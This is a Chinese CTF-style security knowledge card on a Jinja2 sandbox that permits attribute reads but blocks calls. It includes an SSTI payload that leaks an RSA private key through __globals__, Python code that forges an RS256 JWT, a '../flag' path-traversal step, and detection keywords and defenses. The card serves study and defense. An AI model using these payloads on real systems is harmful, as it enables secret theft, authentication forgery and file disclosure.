---
id: web-python-ssti-jinja2-sandbox-attr-only-globals-key-leak
title: Jinja2 自定义沙箱只禁调用不禁属性：用 info.__class__.parse_avatar.__globals__ 读模块全局盗取 RS256 私钥并伪造 JWT
type: scenario
domain: web
path: web/python/ssti
technique: jinja2-sandbox-attribute-only-globals-leak
aliases:
- Jinja2 沙箱只读属性
- is_safe_callable False
- __globals__ 读取模块全局变量
- ShareCard SSTI
- JWT 私钥泄露伪造 token
- avatar 路径穿越读 flag
tags:
- python
- flask
- jinja2
- ssti
- sandbox
- globals
- jwt
- path-traversal
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T08:23:40+08:00'
  notes: 已对照原文（无图片）核对：SaferSandboxedEnvironment覆写is_safe_attribute=True/is_safe_callable=False、show.html的{% include 'style.css' %}、createCard写style.css、payload {{info.__class__.parse_avatar.__globals__.rsakey}}、回显_n/_e/_d/_p/_q组件、RSA重建私钥签RS256、avatar=../flag穿越读文件并base64回显，均与原文一致。原文的固定公钥PEM仅作参考、未参与所示PoC；卡内已注明RSA.construct为等价写法。未验证点：未运行题目环境。
---

## 一句话结论

当应用自定义 `SandboxedEnvironment` 让 `is_safe_attribute` 恒为 `True`、`is_safe_callable` 恒为 `False` 时，模板里虽然不能调用函数/方法（`{{''.__class__.__base__.__subclasses__()}}` 被拦），但仍可用纯属性链 `{{info.__class__.parse_avatar.__globals__.rsakey}}` 读取该方法所属模块（app.py）的全局命名空间，直接泄露模块级 RSA 私钥；随后用私钥按 RS256 伪造 JWT，并把 `avatar` 设为 `../flag`，触发 `open('avatars/'+avatar)` 的路径穿越读出 flag。

## 原理

- **沙箱的两个判断维度**：Jinja2 的 `SandboxedEnvironment` 在 `getattr()` 中对属性访问调用 `is_safe_attribute()`，对调用对象调用 `is_safe_callable()`。本例的 `SaferSandboxedEnvironment` 把前者覆写为恒 `True`、后者恒 `False`，于是“所有属性可读、任何调用不可用”。
- **属性读取不需要调用**：`{{''.__class__}}` 只做属性访问，能回显；而 `{{''.__class__.__base__.__subclasses__()}}` 需要调用 `__subclasses__`，被 `is_safe_callable` 拦下。绕过点不是取消调用限制，而是放弃“调用”，只靠连续属性取值。
- **从实例走到模块全局**：模板上下文里有 `info`（`Info` 实例）→ `info.__class__` 得到 `Info` 类 → `Info.parse_avatar` 是普通 Python 函数对象 → 函数对象的 `__globals__` 属性返回其定义模块的全局字典 → 字典中的 `rsakey` 就是 `app.py` 顶层 `rsakey = RSA.generate(1024)` 生成的私钥对象。整条链全由属性访问组成，不需要 `()`。
- **为什么默认沙箱不会这样**：Jinja2 默认 `is_safe_attribute` 会拒绝以 `_` 开头的属性和内部属性（`__class__`、`__globals__` 等）。本例题把该方法覆写成 `return True`，等于移除了下划线属性保护；这是自定义沙箱“只禁调用”的错误安全假设。
- **泄露后的利用**：`rsakey` 对象的 repr 含 `_n/_e/_d/_p/_q/_u` 全部 RSA 组件，足以重建私钥；服务端只用 `rsakey.publickey()` 校验 token，攻击者用私钥签任意 claims 即可通过。JWT 中的 `avatar` 被 `parse_avatar()` 直接拼进 `avatars/` 后 `open()`，传 `../flag` 即穿越到应用目录的 `flag` 文件并 base64 回显。
- **边界**：模板上下文必须能到达一个普通 Python 函数对象（类方法、普通函数、导入的函数），且其 `__globals__` 中存在敏感全局变量；若沙箱同时正确拦截下划线属性、或模板上下文只传纯数据（dict/str），该链不成立。后续读文件还要求存在可拼接路径的文件读取点。

## 触发条件

- 用户可控内容能作为 Jinja2 模板被渲染（本例通过 `style` 参数写入 `templates/style.css`，再由 `show.html` 的 `{% include 'style.css' %}` 引入）。
- 应用使用自定义 `SandboxedEnvironment`，且 `is_safe_attribute` 放行全部属性、`is_safe_callable` 只禁调用（或等价的“属性不设限”配置）。
- 模板上下文里传入了类实例（本例 `info`），且其类上定义了普通方法；方法所在模块的全局变量含密钥/配置等敏感值。
- 泄露的秘密能用于后续链（JWT 签名密钥、数据库口令、云凭据等）；本例另有一个把用户输入拼进文件路径的 `open()`。

## 利用步骤

1. 确认模板求值：在可控点提交 `{{7*7}}`；再提交 `{{''.__class__}}` 能回显，而 `{{''.__class__.__base__.__subclasses__()}}` 被拦或报错，说明“属性可读、调用被禁”。
2. 找到模板上下文中的实例名（本例 `info`）并沿属性链到函数对象：`{{info.__class__}}`、`{{info.__class__.parse_avatar}}`。
3. 读取模块全局：提交 `{{info.__class__.parse_avatar.__globals__}}` 观察返回的字典；用 `{{info.__class__.parse_avatar.__globals__.rsakey}}` 取出私钥对象。类似键名可按源码猜测（`SECRET_KEY`、`db_password`、`flag` 等）。
4. 若 `__globals__` 被额外拦截，尝试同模块中其它普通函数/类方法，或 `__init__.__globals__`、`__mro__` 等纯属性链；不要使用需要调用的 `__subclasses__()`。
5. 利用泄露：本例取 `_n/_e/_d/_p/_q` 重建 RSA 私钥，用 RS256 签发 `{"name":"aaa","avatar":"../flag","signature":"aaa"}` 的 token。
6. 携带伪造 token 访问 `/showCard`；服务端 `jwt.decode` 通过后 `Info(**data)` 构造对象，`parse_avatar()` 执行 `open('avatars/../flag','rb')`，内容 base64 进 `data:image/svg+xml;base64,...`。
7. 从返回 HTML 提取 base64 并解码得到 flag。若目标不回显源码，改用其它能携带泄露值的响应位置。

## PoC

模板注入点（`style` 内容被写入 `templates/style.css`，随后被 `{% include 'style.css' %}` 渲染）：

```text
style={{info.__class__.parse_avatar.__globals__.rsakey}}
```

回显（节选结构，实际为完整 RSA 私钥对象）：

```text
<style>
{'_n': Integer(...), '_e': Integer(65537), '_d': Integer(...), '_p': Integer(...), '_q': Integer(...), '_u': Integer(...), '_invq': None}
</style>
```

用泄露组件伪造 RS256 token：

```python
from Crypto.PublicKey import RSA
import jwt

n = ...  # 从 __globals__.rsakey 回显中提取
e = 65537
d = ...
p = ...
q = ...
key = RSA.construct((n, e, d, p, q))
token = jwt.encode(
    {"name": "aaa", "avatar": "../flag", "signature": "aaa"},
    key.export_key(),
    algorithm="RS256",
)
print(token)
```

访问 `GET /showCard?token=<token>`，从返回 HTML 的 `data:image/svg+xml;base64,...` 解码得到 flag。说明：原文直接使用泄露的 `_n/_e/_d/_p/_q/_u` 构造 `RSA.RsaKey` 并用固定公钥 PEM 校验；上面的 `RSA.construct` 为等价最小写法。

## 变体与关联

- **只禁调用的通用化**：任何“属性不设限、调用被禁”的模板沙箱，都可用 `<context_obj>.__class__.<method>.__globals__.<secret>` 读取模块全局；若上下文里有导入的普通函数，也可 `<func>.__globals__` 直达。
- **其它敏感全局**：`__globals__` 中除密钥外还可能有数据库连接、云 AK/SK、`os` 模块、`current_app.config`，泄露后可接续不同利用链。
- **JWT 算法混淆**：若目标 PyJWT 版本存在键混淆问题且 `algorithms` 校验不严，可尝试用公钥作 HMAC 密钥签 HS256；本例题原文走的是泄露私钥签 RS256，无需依赖该问题。
- **路径穿越**：`open('avatars/'+avatar)` 未做 `basename`/`realpath` 校验，`../flag` 即可读上级目录；同类拼接点可读任意可读文件。
- **关联**：[[web-python-ssti-jinja2-flask-globals-rce]]（默认 Jinja2 环境从 `lipsum`/`config` 到 `os.popen` 的 `__globals__` 链，触发条件不同）、[[web-python-ssti-jinja2-attr-filter-format-sandbox-escape]]（CVE-2025-27516 用 `|attr` 绕沙箱属性检查，本例题是自定义沙箱主动放开属性）、[[web-python-ssti-jinja2-subclasses-index-rce]]（可调用时的 `__subclasses__` 链，与本例“禁用调用”形成对照）。

## 检测与防御

- **检测**：模板输入/落盘内容出现 `__class__`、`__globals__`、`__mro__`、`__subclasses__`、`__init__`、`__builtins__`、`rsakey`、`SECRET_KEY` 等关键字；同一会话先写模板文件再访问渲染页；JWT 突然出现与正常签发设备不一致的 token、或 `avatar` 含 `../`。
- **防御**：不要覆写 `is_safe_attribute` 为恒 `True`；使用 Jinja2 默认 `SandboxedEnvironment` 或 `ImmutableSandboxedEnvironment`，并保持下划线属性拦截。模板上下文只传纯数据（dict/str/数字），不要传带方法的类实例或模块对象。
- **防御**：签名密钥不要放在模板对象可达的模块全局中；使用 KMS/外部密钥管理，并按最小权限隔离。文件路径参数用 `os.path.basename` + `realpath` 校验必须位于 `avatars/` 目录内。
- **补充**：模板渲染与文件写入分离，禁止用户内容落盘为模板；对 `style` 等“可写模板”的功能直接移除或改为白名单 CSS 属性。
